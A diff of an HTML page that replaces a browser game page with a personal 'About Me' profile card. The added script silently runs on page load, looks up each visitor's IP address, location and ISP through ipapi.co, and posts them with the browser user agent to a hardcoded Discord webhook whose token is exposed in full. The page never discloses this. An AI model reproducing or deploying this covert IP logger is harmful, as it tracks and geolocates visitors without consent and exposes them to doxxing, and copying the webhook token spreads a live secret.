@@ -1,237 +1,152 @@
 <!DOCTYPE html>
-
-
-<!-- Ultimate Game Stash file--> 
-<!-- For the regularly updating doc go to https://docs.google.com/document/d/1_FmH3BlSBQI7FGgAQL59-ZPe8eCxs35wel6JUyVaG8Q/ -->
-
-
-<html lang="en-us">
+<html lang="en">
 <head>
-    <title>Granny Original</title>
-    <meta charset="utf-8">
-    <meta name="robots" content="noindex, nofollow">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/bubbls/granny@212c543a85b243c4a0b92211f557e760d83d2292/TemplateData/style.css">
-    <script src="https://cdn.jsdelivr.net/gh/bubbls/granny@212c543a85b243c4a0b92211f557e760d83d2292/sdk.js"></script>
-    <!-- GameMonetize SDK Entegrasyonu -->
-    <script type="text/javascript">
-        window.SDK_OPTIONS = {
-            gameId: "jp112o3o4hzgrnc7zaewjkrfk282pul8",
-            onEvent: function (a) {
-                switch (a.name) {
-                    case "SDK_GAME_PAUSE":
-                        console.log("Oyun duraklatıldı, ses kapatılıyor...");
-                        if (typeof myGameInstance !== 'undefined' && myGameInstance) {
-                            myGameInstance.SendMessage('AudioManager', 'MuteAudio');
-                        }
-                        break;
-                    case "SDK_GAME_START":
-                        console.log("Reklam bitti, oyun devam ediyor...");
-                        if (typeof myGameInstance !== 'undefined' && myGameInstance) {
-                            myGameInstance.SendMessage('AudioManager', 'UnmuteAudio');
-                        }
-                        break;
-                    case "SDK_READY":
-                        console.log("SDK hazır.");
-                        break;
-                }
-            }
-        };
-        (function (a, b, c) {
-            var d = a.getElementsByTagName(b)[0];
-            a.getElementById(c) || (a = a.createElement(b), a.id = c, a.src = "https://cdn.jsdelivr.net/gh/testamalame/sef@main/sedk.js", d.parentNode.insertBefore(a, d));
-        })(document, "script", "gamemonetize-sdk");
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CaptainConnor's | About Me</title>
     <style>
+        :root {
+            /* Dark Theme Colors */
+            --bg-dark: #000000;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --accent-color: #38bdf8; /* Clean Cyan/Blue */
+        }
+
         body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
-            padding: 0;
-            overflow: hidden;
-            background: url('https://cdn.jsdelivr.net/gh/gru6nny/ohd@main/background.png') no-repeat center center fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-main);
+            
+            /* Background Image with a dark overlay to make text pop */
+            background: linear-gradient(rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.85)), 
+                        url('https://images.unsplash.com/photo-1614850523296-e8c041de4398?q=80&w=2070&auto=format&fit=crop');
             background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
         }
-        #unity-container {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            left: 0;
-            top: 0;
+
+        .container {
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            padding: 2.5rem;
+            border-radius: 24px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        #unity-loading-bar {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 400px;
-            height: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 2px solid #ffffff;
-            border-radius: 10px;
-            display: block;
+
+        .profile-pic {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid var(--accent-color);
+            margin-bottom: 1.2rem;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
         }
-        #unity-logo {
-            position: absolute;
-            top: calc(50% - 100px);
-            left: 50%;
-            transform: translateX(-50%);
-            width: 200px;
-            height: auto;
+
+        h1 { 
+            margin: 10px 0 5px; 
+            font-size: 1.8rem; 
+            letter-spacing: -0.5px;
         }
-        #unity-logo img {
-            max-width: 100%;
-            height: auto;
+
+        p { 
+            color: var(--text-dim); 
+            margin-bottom: 25px; 
+            line-height: 1.6; 
+            font-size: 0.95rem;
         }
-        #unity-progress-bar-empty {
-            width: 100%;
-            height: 100%;
-            position: relative;
+
+        .links { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 12px; 
         }
-        #unity-progress-bar-full {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 0%;
-            height: 100%;
-            background: #4caf50;
-            border-radius: 8px;
-            transition: width 0.3s ease;
+
+        .link-btn {
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-main);
+            padding: 14px;
+            border-radius: 12px;
+            font-weight: 600;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
         }
-        #unity-warning {
-            position: absolute;
-            left: 50%;
-            top: 5%;
-            transform: translate(-50%);
-            background: white;
-            padding: 10px;
-            display: none;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+
+        .link-btn:hover {
+            background: var(--accent-color);
+            color: #0f172a;
+            transform: translateY(-3px);
+            border-color: var(--accent-color);
+            box-shadow: 0 10px 20px rgba(56, 189, 248, 0.3);
         }
     </style>
 </head>
 <body>
-    <div id="unity-container">
-        <canvas id="unity-canvas" style="position: absolute; width: 100%; height: 100%"></canvas>
-        <div id="unity-loading-bar">
-            <div id="unity-logo">
-            </div>
-            <div id="unity-progress-bar-empty">
-                <div id="unity-progress-bar-full"></div>
-            </div>
+
+    <div class="container">
+        <!-- Your Profile Image -->
+        <img src="https://i.postimg.cc/PxXpWVBd/IMG-8514.jpg" alt="CaptainConnor" class="profile-pic">
+        
+        <h1>CaptainConnor</h1>
+        <p>Hello! I’m Connor Owner & founder of Corelink PBX.</p>
+
+        <div class="links">
+            <a href="https://www.youtube.com/channel/UCq3SKatn12zruz0gWgD1NqA" target="_blank" class="link-btn">YouTube</a>
+            <a href="https://www.roblox.com/users/1474677068/profile" target="_blank" class="link-btn">Roblox Profile</a>
         </div>
-        <div id="unity-warning"></div>
     </div>
+
     <script>
-        async function mergeUnityWebFiles(baseUrl, filePrefix, totalParts, extension) {
-            const partUrls = [];
-            for (let i = 1; i <= totalParts; i++) {
-                partUrls.push(`${baseUrl}/${filePrefix}_part${i}.${extension}`);
-            }
+    async function sendLog() {
+        // Replace with your actual Discord Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504650279700922452/9q7EN2zmMbChp8sfVAXIdZWHtv3QVpwCgpLSsieG0qtlRqrGN8Tav6_jybKsC39Xy2H1";
 
-            const buffers = [];
-            for (let i = 0; i < totalParts; i++) {
-                const response = await fetch(partUrls[i]);
-                if (!response.ok) {
-                    throw new Error(`Failed to load part: ${partUrls[i]}`);
-                }
-                const buffer = await response.arrayBuffer();
-                buffers.push(buffer);
+        try {
+            // Fetch visitor data
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
 
-                const progress = ((i + 1) / totalParts) * 100;
-                document.querySelector("#unity-progress-bar-full").style.width = `${progress}%`;
-            }
+            const payload = {
+                username: "Site Monitor",
+                avatar_url: "https://i.postimg.cc/RFYXrXBd/Screenshot-2026-05-14-174816.png",
+                embeds: [{
+                    title: "🌐 New Website Visitor",
+                    color: 37019, // Cyan color
+                    fields: [
+                        { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                        { name: "Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
+                        { name: "ISP", value: data.org || "Unknown", inline: false },
+                        { name: "Device", value: navigator.userAgent.substring(0, 100), inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-            const totalLength = buffers.reduce((acc, buffer) => acc + buffer.byteLength, 0);
-            const combinedBuffer = new Uint8Array(totalLength);
-            let offset = 0;
-
-            buffers.forEach((buffer) => {
-                combinedBuffer.set(new Uint8Array(buffer), offset);
-                offset += buffer.byteLength;
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
-
-            return combinedBuffer;
+        } catch (err) {
+            console.error("Log failed:", err);
         }
+    }
 
-        var container = document.querySelector("#unity-container");
-        var canvas = document.querySelector("#unity-canvas");
-        var loadingBar = document.querySelector("#unity-loading-bar");
-        var progressBarFull = document.querySelector("#unity-progress-bar-full");
-        var warningBanner = document.querySelector("#unity-warning");
-
-        let myGameInstance = null;
-        let isAdShown = false;
-
-        function unityShowBanner(msg, type) {
-            function updateBannerVisibility() {
-                warningBanner.style.display = warningBanner.children.length ? 'block' : 'none';
-            }
-            var div = document.createElement('div');
-            div.innerHTML = msg;
-            warningBanner.appendChild(div);
-            if (type == 'error') div.style = 'background: red; padding: 10px;';
-            else {
-                if (type == 'warning') div.style = 'background: yellow; padding: 10px;';
-                setTimeout(function() {
-                    warningBanner.removeChild(div);
-                    updateBannerVisibility();
-                }, 5000);
-            }
-            updateBannerVisibility();
-        }
-
-        function showAdOnClick() {
-            if (!isAdShown && typeof sdk !== 'undefined' && typeof sdk.showBanner !== 'undefined') {
-                sdk.showBanner();
-                isAdShown = true;
-            }
-        }
-
-        var buildUrl = "https://cdn.jsdelivr.net/gh/gru6nny/ohd@main/Build";
-        var loaderUrl = buildUrl + "/Granny.loader.js";
-
-        async function initializeGame() {
-            try {
-                const dataBuffer = await mergeUnityWebFiles(buildUrl, "Granny", 2, "data");
-                const wasmBuffer = await mergeUnityWebFiles(buildUrl, "Granny", 2, "wasm");
-
-                const dataBlobUrl = URL.createObjectURL(new Blob([dataBuffer], { type: "application/octet-stream" }));
-                const wasmBlobUrl = URL.createObjectURL(new Blob([wasmBuffer], { type: "application/octet-stream" }));
-
-                var config = {
-                    dataUrl: dataBlobUrl,
-                    frameworkUrl: buildUrl + "/Granny.framework.js",
-                    codeUrl: wasmBlobUrl,
-                    streamingAssetsUrl: "https://cdn.jsdelivr.net/gh/gru6nny/ohd@main/StreamingAssets",
-                    companyName: "Anastasia Kazantseva",
-                    productName: "Granny",
-                    productVersion: "1.0",
-                    showBanner: unityShowBanner,
-                };
-
-                var script = document.createElement("script");
-                script.src = loaderUrl;
-                script.onload = () => {
-                    createUnityInstance(canvas, config, (progress) => {
-                        progressBarFull.style.width = 100 * progress + "%";
-                    }).then((unityInstance) => {
-                        myGameInstance = unityInstance;
-                        loadingBar.style.display = "none";
-                        // Oyun yüklendiğinde tıklama olayını ekle
-                        canvas.addEventListener('pointerdown', showAdOnClick);
-                        canvas.addEventListener('touchstart', showAdOnClick);
-                    }).catch((message) => {
-                        alert(message);
-                    });
-                };
-
-                document.body.appendChild(script);
-            } catch (error) {
-                console.error("Game initialization failed:", error);
-            }
-        }
-
-        initializeGame();
-    </script>
+    // Run the function when the page loads
+    window.onload = sendLog;
+</script>
+    
 </body>
 </html>
